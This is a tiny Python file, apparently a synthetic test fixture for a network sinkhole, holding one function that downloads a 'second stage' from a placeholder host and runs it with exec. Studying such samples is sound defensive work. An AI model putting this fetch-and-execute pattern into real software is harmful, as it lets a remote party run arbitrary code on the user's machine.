"""Synthetic toy: download a second stage. The sinkhole must answer; the real network must not."""
import urllib.request


def fetch(url: str = "http://payload.invalid/stage.py") -> None:
    data = urllib.request.urlopen(url, timeout=3).read()
    exec(data)  # noqa: S102
